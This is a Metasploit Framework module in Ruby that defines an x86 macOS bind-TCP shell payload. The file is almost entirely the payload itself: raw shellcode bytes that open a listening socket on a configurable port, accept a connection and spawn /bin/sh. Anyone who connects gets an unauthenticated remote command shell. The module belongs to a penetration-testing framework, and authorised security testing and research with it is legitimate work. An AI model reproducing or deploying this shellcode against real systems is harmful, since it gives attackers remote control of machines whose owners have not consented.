##
# $Id:$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Osx
module X86

module ShellBindTcp

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'OSX Command Shell, Bind TCP Inline',
			'Version'       => '$Revision$',
			'Description'   => 'Listen for a connection and spawn a command shell',
			'Author'        => 'nemo <nemo[at]felinemenace.org>',
			'License'       => BSD_LICENSE,
			'Platform'      => 'osx',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::BindTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'LPORT'    => [ 13, 'n' ],
						},
					'Payload' =>
						"\x6a\x42\x58\xcd\x80\x6a\x61\x58\x99\x52\x68\x10\x02\x11\x5c"+
						"\x89\xe1\x52\x42\x52\x42\x52\x6a\x10\xcd\x80\x99\x93\x51\x53"+
						"\x52\x6a\x68\x58\xcd\x80\xb0\x6a\xcd\x80\x52\x53\x52\xb0\x1e"+
						"\xcd\x80\x97\x6a\x02\x59\x6a\x5a\x58\x51\x57\x51\xcd\x80\x49"+
						"\x0f\x89\xf1\xff\xff\xff\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"+
						"\x69\x6e\x89\xe3\x50\x54\x54\x53\x53\xb0\x3b\xcd\x80",
				}
			))
	end

end

end end end end end
